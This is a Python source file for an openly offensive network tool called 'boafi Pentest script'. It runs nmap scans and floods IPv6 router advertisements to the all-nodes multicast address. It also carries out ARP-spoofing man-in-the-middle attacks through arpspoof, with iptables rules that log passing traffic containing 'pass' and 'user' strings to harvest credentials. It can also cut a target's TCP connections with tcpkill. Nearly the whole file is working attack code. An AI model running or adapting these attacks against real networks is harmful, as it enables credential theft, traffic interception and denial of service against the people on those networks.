########## boafi Pentest script
########## - Perform various pentests automatically and save reports for further study
########## - Features/TODOs: Ipv6,DHCP,DNS,NTP,exploits,mitm..
########## - Router bruteforce for easy guessable passwords
########## - Scan networks hosts and identify vulnerabilities
########## ...

###  Author: Yessou Sami 
###  Project Boafi


#!/usr/bin/python

import os,time,argparse,random
from scapy.all import *


parser = argparse.ArgumentParser()


parser.add_argument('-RA', action='store', dest='ipv6ra', default=False,
                    help='Flood ipv6 router advertisements for given minutes')


parser.add_argument('-file', action='store', dest='output', default=False,
                    help='File output for scans')


parser.add_argument('-scan', action='store', dest='scan', default=False,
                    help='Scan the given network address or host')


parser.add_argument('--syn', action='store_true', dest='syn', default=False,
                    help='SYN Scan enabled')

parser.add_argument('--service', action='store_true', dest='service', default=False,
                    help='Service Version detection enabled')


parser.add_argument('-mitm', action='store', dest='mitm', default="none",
                    help='Perform MITM Attack on target')

parser.add_argument('-stop-mitm', action='store_true', dest='stopmitm', default=False,
                    help='Stop any Running MITM Attack')

parser.add_argument('--denyTcp', action='store', dest='denytcp', default="none",
                    help='Deny tcp connections of give host')

parser.add_argument('--dg', action='store', dest='dg', default="none",
                    help='Perform MITM Attack with given Default Gateway')


results = parser.parse_args()


if not(results.output):
        output=os.popen("date").read()

output=results.output
syn=""
scantype="-sn" #basic ping scan
if(results.scan):
        ipaddr=str(results.scan)
        print ipaddr
        if(results.syn):
                scantype="-sS -O" #syn and
        if(results.service):
                scantype=scantype+" -sV"
        scancmd="sudo nmap "+scantype+" -oX "+output+" "+ipaddr   #writes xml output so we can convert it into html
        print scancmd
        print os.popen(scancmd).read() #ping scan to know online hosts



if(results.ipv6ra):
        minutes=results.ipv6ra
        print "running for minutes: "+minutes
        #run ipv6 RA flooding for N minutes
        i=0
        while (i <= minutes):
                print "Firing RAs everywhere"
                a = IPv6()
                a.dst = "ff02::1" #IPv6 Destination "Everyone" Multicast (broadcast)
                a.display()
                b = ICMPv6ND_RA()
                b.display()
                c = ICMPv6NDOptSrcLLAddr()
                c.lladdr = "00:60:16:14:2e:c0" #MAC
                c.display()
                d = ICMPv6NDOptMTU()
                d.display()
                e = ICMPv6NDOptPrefixInfo()
                e.prefixlen = 64
                randomhex=hex(random.randint(0, 16777215))[2:].upper()
                prefix=randomhex[:4]
                e.prefix = prefix+"::" #Global Prefix
                e.display()
                send(a/b/c/d/e)  # Send the packet
                print "Sending IPv6 RA Packet :)"
                time.sleep(1)
                i=i+1
                print i

if not(results.mitm=="none"):
        print "im in"
        target=results.mitm
        if(results.dg=="none"):
                dg=os.popen("ip route show | grep 'default' | awk '{print $3}' ").read()
                dg=dg.split()[0]
                print dg
        else:
                dg=results.dg
        #Automatically searches for gateway and arpspoof all hosts
        os.popen("nohup  arpspoof -t "+target+" "+dg+" >/dev/null 2>&1 &")
        #Start ARP Spoofing with given arguments or calculated ones
        os.popen("iptables -I FORWARD -p all -j LOG --log-prefix 'GENERAL-LOG'")
        #Start Logging every connection to /var/log/messages

        #Log also images on /tmp?
        os.popen("iptables -I FORWARD -p all -m string --string 'jpg' --algo kmp  -j LOG --log-prefix 'JPG-LOG'")
        os.popen("iptables -I FORWARD -p all -m string --string 'gif' --algo kmp  -j LOG --log-prefix 'GIF-LOG'")
        os.popen("iptables -I FORWARD -p all -m string --string 'png' --algo kmp  -j LOG --log-prefix 'PNG-LOG'")
        os.popen("iptables -I FORWARD -p all -m string --string 'mp4' --algo kmp  -j LOG --log-prefix 'mp4-LOG'")
        #Log urls/web request
        os.popen("iptables -I FORWARD -p tcp -m multiport --dports 80,443 -j LOG --log-prefix 'WWW-LOG' ")
        #Log DNS
        os.popen("iptables -I FORWARD -p udp --dport 53 -j LOG --log-prefix 'DNS-LOG'")
        #Log credentials HTTP
        os.popen("iptables -I FORWARD -p all -m string --string 'pass' --algo kmp -j LOG --log-prefix 'PASSWORD-LOG'")
        os.popen("iptables -I FORWARD -p all -m string --string 'user' --algo kmp  -j LOG --log-prefix 'USERNAME-LOG'")
        print "Added temp firewall rules to log MITM traffic"
        if not(results.denytcp):
                os.popen("nohup tcpkill host "+target+" >/dev/null 2>&1 &")
                #deny tcp traffic
if(results.stopmitm): #Stop MITM...hosts should re-generate ARP automatically
        os.popen("killall arpspoof")
        os.popen("killall tcpkill")


# TODO
## mitm --> interact with SDS to get realtime data for visualization
## metasploit attacks?
## if connected to internet send info on "cloud"(site db)
## save data on xml,csv for webGUI visualization
